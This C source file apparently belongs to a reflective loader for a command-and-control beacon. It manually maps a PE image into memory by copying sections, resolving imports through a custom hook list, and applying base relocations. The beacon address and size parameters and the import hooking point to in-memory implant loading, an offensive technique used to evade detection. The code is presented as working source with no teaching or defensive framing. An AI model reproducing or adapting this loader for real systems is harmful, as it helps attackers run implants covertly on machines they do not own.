#include <Windows.h>

#include "ntdll.h"
#include "hash.h"
#include "macro.h"
#include "api.h"
#include "instance.h"
#include "k32.h"
#include "hook.h"

typedef struct {
    WORD    offset : 12;
    WORD    type : 4;
} XIMAGE_RELOC, * XPIMAGE_RELOC;

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} XBASE_RELOCATION_BLOCK, * XPBASE_RELOCATION_BLOCK;

#pragma code_seg(".text$d")
BOOL CopyPESections(ULONG_PTR srcImage, ULONG_PTR dstAddress) 
{
    
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(srcImage + ((PIMAGE_DOS_HEADER)srcImage)->e_lfanew);
    PBYTE srcHeader = (PBYTE)srcImage;
    PBYTE dstHeader = (PBYTE)dstAddress;

    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&ntHeader->OptionalHeader + ntHeader->FileHeader.SizeOfOptionalHeader);
    DWORD numberOfSections = ntHeader->FileHeader.NumberOfSections;

    while (numberOfSections--) {
        PBYTE dstSection = (PBYTE)dstAddress + sectionHeader->VirtualAddress;
        PBYTE srcSection = (PBYTE)srcImage + sectionHeader->PointerToRawData;
        DWORD sizeOfData = sectionHeader->SizeOfRawData;
        if (!_memcpy(dstSection, srcSection, sizeOfData)) {
            return FALSE;
        }

        sectionHeader++;
    }
    return TRUE;
}

#pragma code_seg(".text$d")
void ResolveImports(PIMAGE_NT_HEADERS ntHeader, ULONG_PTR dstAddress, PINSTANCE Inst, PHOOK_LIST hook, PLOADER_INFO info, UINT_PTR uiBeaconAddr, UINT_PTR uiBeaconSize)
{
    PIMAGE_DATA_DIRECTORY importDataDirectoryEntry = &(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(dstAddress + importDataDirectoryEntry->VirtualAddress);


    while (importDescriptor->Name) {
        LPCSTR libraryName = (LPCSTR)(dstAddress + importDescriptor->Name);
        ULONG_PTR libraryBaseAddress = (ULONG_PTR)xLoadLibraryA(libraryName, Inst);

        PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)(dstAddress + importDescriptor->OriginalFirstThunk);
        PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)(dstAddress + importDescriptor->FirstThunk);
        while (DEREF(IAT)) {
            if (INT && INT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                PIMAGE_NT_HEADERS libraryPEHeader = (PIMAGE_NT_HEADERS)(libraryBaseAddress + ((PIMAGE_DOS_HEADER)libraryBaseAddress)->e_lfanew);
                PIMAGE_DATA_DIRECTORY exportDataDirectoryEntry = &(libraryPEHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(libraryBaseAddress + exportDataDirectoryEntry->VirtualAddress);
                ULONG_PTR addressArray = libraryBaseAddress + exportDirectory->AddressOfFunctions;
                addressArray += (IMAGE_ORDINAL(INT->u1.Ordinal) - exportDirectory->Base) * sizeof(DWORD);
                DEREF(IAT) = libraryBaseAddress + DEREF_32(addressArray);
            }
            else {
                PIMAGE_IMPORT_BY_NAME importName = (PIMAGE_IMPORT_BY_NAME)(dstAddress + DEREF(IAT));
                LPCSTR functionName = importName->Name;
                ULONG_PTR functionAddress = 0;

                UINT_PTR uiHook = 0;
                uiHook = (UINT_PTR)ResolveHook(functionName, hook);
                if (uiHook == NULL)
                {
                    uiHook = (UINT_PTR)xLdrGetProcedureAddress((HMODULE)libraryBaseAddress, (LPSTR)functionName, Inst); 
                }

                DEREF(IAT) = uiHook;
        
            }
            // Get the next imported function
            ++IAT;
            if (INT) {
                ++INT;
            }
        }
        // Get the next import
        importDescriptor++;
    }
    return;
}

#pragma code_seg(".text$d")
void ProcessRelocations(PIMAGE_NT_HEADERS ntHeader, ULONG_PTR dstAddress) 
{

    ULONG_PTR delta = dstAddress - ntHeader->OptionalHeader.ImageBase;
    PIMAGE_DATA_DIRECTORY relocDataDirectoryEntry = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if ((relocDataDirectoryEntry)->Size > 0) {
        PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(dstAddress + relocDataDirectoryEntry->VirtualAddress);
        while (baseRelocation->SizeOfBlock) {
            ULONG_PTR relocationBlock = (dstAddress + baseRelocation->VirtualAddress);
            ULONG_PTR relocationCount = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(XIMAGE_RELOC);
            XPIMAGE_RELOC relocation = (XPIMAGE_RELOC)((ULONG_PTR)baseRelocation + sizeof(IMAGE_BASE_RELOCATION));
            while (relocationCount--) {

                if ((relocation)->type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR*)(relocationBlock + relocation->offset) += delta;
                else if (relocation->type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD*)(relocationBlock + relocation->offset) += (DWORD)delta;
                else if (relocation->type == IMAGE_REL_BASED_HIGH)
                    *(WORD*)(relocationBlock + relocation->offset) += HIWORD(delta);
                else if (relocation->type == IMAGE_REL_BASED_LOW)
                    *(WORD*)(relocationBlock + relocation->offset) += LOWORD(delta);
                relocation++;
            }
            baseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)baseRelocation + baseRelocation->SizeOfBlock);
        }
    }
    return;
}